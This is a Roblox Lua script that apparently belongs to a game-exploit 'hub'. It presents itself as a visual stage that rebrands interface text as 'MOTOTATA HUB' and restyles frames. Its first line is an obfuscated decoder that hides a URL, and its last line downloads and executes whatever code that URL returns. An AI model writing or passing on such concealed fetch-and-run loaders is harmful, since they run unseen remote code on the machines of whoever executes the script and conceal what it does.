
--[[ STAGE 2: VISUAL CORE ]]
local IDN7gK_1WYpO7IBw="\247\252\217\001\254\190\243\217\024\193\208\192\028\223\222\211\033\226\224\216\222\208\202\221\207\041\042\024\208\212\217\218\239"local JF3ilQNkDACbM=243 local hhnELZejhoIWipMqXSJde=24 local hXlhw7ra8snuJ_qry=0 local D0XJjEEymP57gK8=1 local ovoISO_MkBlf=27 local BptOe5STJLUg1=true local RwAAR3SsZ0kFXWDkaeXDu=bit32 and bit32.bxor if not RwAAR3SsZ0kFXWDkaeXDu then RwAAR3SsZ0kFXWDkaeXDu=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local ucrVr_JBcZiMrbEbs6={}for JKz5cqombKS4BW4BTIYgO=1,#IDN7gK_1WYpO7IBw do local DMDeUXek9Khr1Ulm8hyssm=string.byte(IDN7gK_1WYpO7IBw,JKz5cqombKS4BW4BTIYgO)local LTQiVUmCtsOB4F=(hhnELZejhoIWipMqXSJde+(JKz5cqombKS4BW4BTIYgO*D0XJjEEymP57gK8)+ovoISO_MkBlf)%256 if hXlhw7ra8snuJ_qry==0 then DMDeUXek9Khr1Ulm8hyssm=(DMDeUXek9Khr1Ulm8hyssm-LTQiVUmCtsOB4F)%256 ucrVr_JBcZiMrbEbs6[JKz5cqombKS4BW4BTIYgO]=string.char(RwAAR3SsZ0kFXWDkaeXDu(DMDeUXek9Khr1Ulm8hyssm,JF3ilQNkDACbM))else DMDeUXek9Khr1Ulm8hyssm=RwAAR3SsZ0kFXWDkaeXDu(DMDeUXek9Khr1Ulm8hyssm,JF3ilQNkDACbM)ucrVr_JBcZiMrbEbs6[JKz5cqombKS4BW4BTIYgO]=string.char((DMDeUXek9Khr1Ulm8hyssm-LTQiVUmCtsOB4F)%256)end end local LjdSq7OM7QngvCu=table.concat(ucrVr_JBcZiMrbEbs6)if BptOe5STJLUg1 then LjdSq7OM7QngvCu=string.reverse(LjdSq7OM7QngvCu)end local sd2UhlGlCwRCEec=LjdSq7OM7QngvCu
local HubName = "MOTOTATA HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(sd2UhlGlCwRCEec))()
